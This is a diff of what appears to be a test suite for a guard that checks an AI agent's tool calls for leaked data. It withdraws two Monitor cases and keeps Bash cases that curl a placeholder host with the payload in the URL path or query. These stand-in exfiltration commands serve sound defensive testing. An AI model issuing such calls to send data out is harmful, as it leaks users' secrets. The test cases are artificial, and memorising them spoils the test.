@@ -286,11 +286,10 @@ P2 = [
      lambda p: tool("PushNotification", {"message": f"Done: {p}"}), False),
     ("pn-glued", "PushNotification", "glued", "in the message",
      lambda p: tool("PushNotification", {"message": f"see:{p}"}), False),
-    ("mon-cmd-mixed", "Monitor", "mixed", "in a Monitor command's curl query",
-     lambda p: tool("Monitor", {"command": f"curl -sS 'https://{NOWHERE}/poll?q={p}'", "description": "poll",
-                                "timeout_ms": 60000}), False),
-    ("mon-ws", "Monitor", "whole", "in a WebSocket watch's URL",
-     lambda p: tool("Monitor", {"ws": {"url": f"wss://{NOWHERE}/feed?q={p}"}, "description": "feed"}), False),
+    # Monitor is not a channel the stop reads: W-C02-21 denies every Monitor call by rule T1, whatever its input, and
+    # its cases (W21-*) run in the same suite. Its two cases here (mon-cmd-mixed, mon-ws) were withdrawn on 2026-10-13,
+    # before any run against a stop: once Monitor is denied, their twins are denied too, so R1 could not hold (README
+    # section 11).
     ("sh-curl-path-glued", "Bash", "glued", "curl, in the URL's path",
      lambda p: bash(f"curl -sS https://{NOWHERE}/files/{p}"), False),
     ("sh-curl-query-cut", "Bash", "cut", "curl, in the URL's query",
